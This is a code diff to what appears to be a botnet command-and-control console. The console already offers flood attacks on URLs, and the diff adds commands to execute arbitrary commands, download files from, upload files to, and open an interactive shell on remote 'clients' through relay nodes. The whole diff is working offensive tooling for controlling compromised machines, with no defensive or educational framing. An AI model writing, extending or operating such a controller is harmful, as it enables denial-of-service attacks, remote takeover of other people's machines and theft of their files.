@@ -1,4 +1,6 @@
 import json
+import os
+import base64
 import re
 import subprocess
 import shlex
@@ -73,6 +75,82 @@ class Functions:
                 f"{Fore.RED}Error: Invalid response from node {node_id}: {resp}{Style.RESET_ALL}"
             )
             return None
+
+    def send_exec(self, node_id, client_id, command):
+        resp = self.controller.send_to(node_id, Payloads.exec_command(client_id, command))
+        if not resp:
+            print(f"{Fore.RED}Error: No response from node {node_id}{Style.RESET_ALL}")
+            return None
+        try:
+            data = json.loads(resp)
+            if data.get("status") == "success":
+                client_resp = json.loads(data.get("data", "{}"))
+                if client_resp.get("status") == "success":
+                    stdout = client_resp.get("stdout", "")
+                    stderr = client_resp.get("stderr", "")
+                    rc = client_resp.get("returncode", -1)
+                    if stdout:
+                        print(f"{Fore.GREEN}[stdout]{Style.RESET_ALL}\n{stdout}")
+                    if stderr:
+                        print(f"{Fore.RED}[stderr]{Style.RESET_ALL}\n{stderr}")
+                    print(f"{Fore.YELLOW}[exit code: {rc}]{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.RED}Error from client {client_id}: {client_resp.get('error', 'unknown')}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}Node error: {data.get('message', 'unknown')}{Style.RESET_ALL}")
+            return data
+        except (json.JSONDecodeError, TypeError) as e:
+            print(f"{Fore.RED}Error parsing response: {e}{Style.RESET_ALL}")
+            return None
+
+    def send_download(self, node_id, client_id, path):
+        resp = self.controller.send_to(node_id, Payloads.download(client_id, path))
+        if not resp:
+            print(f"{Fore.RED}Error: No response from node {node_id}{Style.RESET_ALL}")
+            return None
+        try:
+            data = json.loads(resp)
+            if data.get("status") == "success":
+                client_resp = json.loads(data.get("data", "{}"))
+                if client_resp.get("status") == "success":
+                    content_b64 = client_resp.get("content_b64", "")
+                    fpath = client_resp.get("path", "downloaded_file")
+                    content = base64.b64decode(content_b64)
+                    local_name = f"downloaded_{os.path.basename(fpath)}"
+                    with open(local_name, "wb") as f:
+                        f.write(content)
+                    print(f"{Fore.GREEN}Downloaded {fpath} ({len(content)} bytes) to {local_name}{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.RED}Error from client {client_id}: {client_resp.get('error', 'unknown')}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}Node error: {data.get('message', 'unknown')}{Style.RESET_ALL}")
+            return data
+        except (json.JSONDecodeError, TypeError, OSError) as e:
+            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+            return None
+
+    def send_upload(self, node_id, client_id, path, content_b64):
+        resp = self.controller.send_to(node_id, Payloads.upload(client_id, path, content_b64))
+        if not resp:
+            print(f"{Fore.RED}Error: No response from node {node_id}{Style.RESET_ALL}")
+            return None
+        try:
+            data = json.loads(resp)
+            if data.get("status") == "success":
+                client_resp = json.loads(data.get("data", "{}"))
+                if client_resp.get("status") == "success":
+                    print(f"{Fore.GREEN}Uploaded to {client_resp.get('path', path)}{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.RED}Error from client {client_id}: {client_resp.get('error', 'unknown')}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}Node error: {data.get('message', 'unknown')}{Style.RESET_ALL}")
+            return data
+        except (json.JSONDecodeError, TypeError) as e:
+            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+            return None
+
+    def send_shell(self, node_id, client_id, command):
+        return self.send_exec(node_id, client_id, command)
 
 
 class Commands:
@@ -294,6 +372,30 @@ class Commands:
                 "Start flood attack on a URL",
                 3,
             ),
+            (
+                "exec",
+                "exec <node_id> <client_id> <command>",
+                "Execute a command on a remote client",
+                3,
+            ),
+            (
+                "download",
+                "download <node_id> <client_id> <path>",
+                "Download a file from a remote client",
+                3,
+            ),
+            (
+                "upload",
+                "upload <node_id> <client_id> <local_file> <remote_path>",
+                "Upload a file to a remote client",
+                3,
+            ),
+            (
+                "shell",
+                "shell <node_id> <client_id>",
+                "Interactive shell on a remote client",
+                3,
+            ),
             ("!", "! <command>", "Execute a local shell command (admin only)", 3),
         ]
 
@@ -511,6 +613,58 @@ class Commands:
         print(f"\nAvailable Flood Methods:{Style.RESET_ALL}")
         for layer, methods in self.VALID_METHODS.items():
             print(f"  {layer}: {Fore.YELLOW}{', '.join(methods)}{Style.RESET_ALL}")
+
+    def exec_cmd(self, shell, args):
+        if len(args) < 3:
+            print(f"{Fore.RED}Usage: exec <node_id> <client_id> <command...>{Style.RESET_ALL}")
+            return
+        node_id = args[0]
+        client_id = args[1]
+        command = " ".join(args[2:])
+        self.functions.send_exec(node_id, client_id, command)
+
+    def download(self, shell, args):
+        if len(args) < 3:
+            print(f"{Fore.RED}Usage: download <node_id> <client_id> <path>{Style.RESET_ALL}")
+            return
+        node_id = args[0]
+        client_id = args[1]
+        path = " ".join(args[2:])
+        self.functions.send_download(node_id, client_id, path)
+
+    def upload(self, shell, args):
+        if len(args) < 4:
+            print(f"{Fore.RED}Usage: upload <node_id> <client_id> <local_file> <remote_path>{Style.RESET_ALL}")
+            return
+        node_id = args[0]
+        client_id = args[1]
+        local_file = args[2]
+        remote_path = args[3]
+        try:
+            with open(local_file, "rb") as f:
+                content = base64.b64encode(f.read()).decode()
+            self.functions.send_upload(node_id, client_id, remote_path, content)
+        except OSError as e:
+            print(f"{Fore.RED}Error reading {local_file}: {e}{Style.RESET_ALL}")
+
+    def shell(self, shell, args):
+        if len(args) < 2:
+            print(f"{Fore.RED}Usage: shell <node_id> <client_id>{Style.RESET_ALL}")
+            return
+        node_id = args[0]
+        client_id = args[1]
+        print(f"{Fore.YELLOW}Entering interactive shell on {node_id}/{client_id}. Type 'exit' to quit.{Style.RESET_ALL}")
+        while True:
+            try:
+                cmd = input(f"{Fore.CYAN}{client_id}$ {Style.RESET_ALL}").strip()
+                if not cmd:
+                    continue
+                if cmd.lower() in ("exit", "quit"):
+                    break
+                self.functions.send_shell(node_id, client_id, cmd)
+            except KeyboardInterrupt:
+                print()
+                break
 
     def quit(self, shell, args):
         self.controller.shutdown()
